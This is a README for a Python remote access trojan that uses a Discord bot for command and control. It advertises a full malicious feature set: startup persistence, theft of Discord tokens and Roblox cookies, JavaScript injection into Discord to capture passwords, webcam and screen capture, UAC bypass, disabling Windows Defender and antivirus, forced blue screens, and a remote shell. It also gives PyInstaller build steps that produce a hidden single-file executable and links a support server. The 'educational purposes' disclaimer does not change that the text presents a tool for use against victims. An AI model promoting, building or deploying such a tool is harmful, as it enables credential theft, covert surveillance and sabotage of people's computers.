# Discord RAT V2 ❤

> ⚠️ **This project is strictly for educational and ethical research purposes only.**  
> It is meant to demonstrate how remote access mechanisms work **in a controlled test environment (e.g., a virtual machine)**.  
> **Unauthorized deployment or use of this software on real systems is illegal and strictly prohibited.**

---

## 💡 Overview

This is a **Remote Access Trojan (RAT)** written in **Python** utilizing the **Discord Bot API** as its command-and-control (C2) mechanism.  
The tool is a **proof-of-concept** designed to demonstrate the potential abuse of messaging platforms for remote control purposes.

---
# ⭐
## 10 Stars Update:
- **Discord Injection**  
  - Injects JavaScript to track password changes and capture new + old tokens

# ⭐

## Feature List:

### 🛠 On Startup Behavior
- **Adds itself in startup:** 
  - `regedit` under `"Run"`  
  - `shell:startup` folder
- **Auto-Stealer**  
  - Steals Discord tokens, and more on first launch
- Checks for existing instances  
  - If already running, terminates the one with **lower permissions**

---

## 🔧 Commands

### 🎯 Stealers
- `!token` – Steals Discord token  
- `!roblox` – Steals Roblox cookies 

### 📸 Surveillance
- `!screenshot` – Takes a screenshot of the desktop  
- `!webcam` – Captures a webcam photo 

### 🔐 Privilege Escalation
- `!getadmin` – Prompts UAC until user accepts  
- `!uacbypass` – Gains admin rights without UAC  
- `!admin` – Checks for admin permissions  

### ⚔️ System Manipulation
- `!bluescreen` – Forces a Blue Screen of Death  
- `!critproc` – Marks process as critical (causes BSOD if killed)  
- `!shutdown` – Shuts down the victim’s computer  

### 🚫 Disabling Protections
- `!exclude_exe` – Excludes `.exe` files from Windows Defender  
- `!windef` – Enables/disables Windows Defender  
- `!blocklist` – Blocks access to antivirus websites  
- `!taskmgr` – Enables/disables Task Manager  
- `!nostartup` – Prevents user from accessing the startup folder  

### 📂 File & Directory Control
- `!list` – Lists files in the current directory  
- `!cd` – Changes working directory  
- `!exec (path)` – Executes a file at a given path  
- `!download` – Downloads a file from the victim’s PC  
- `!upload` – Uploads a file to the victim’s PC  

### ⚙️ Process & Shell Control
- `!shell "cmd"` – Executes a shell command

---

## ⚙️ Requirements

- Python 3.9

## BUILD

- 1 - `pip install pyinstaller`
- 
- 2 - `pyinstaller hzzh.py --noconsole --onefile --hidden-import=aiohttp --hidden-import=cv2 --hidden-import=discord --hidden-import=psutil --hidden-import=requests --hidden-import=pyautogui --hidden-import=pyaes --hidden-import=colorama --hidden-import=urllib3 --hidden-import=pywin32`

## HELP
- https://discord.gg/umkFfBRn6B
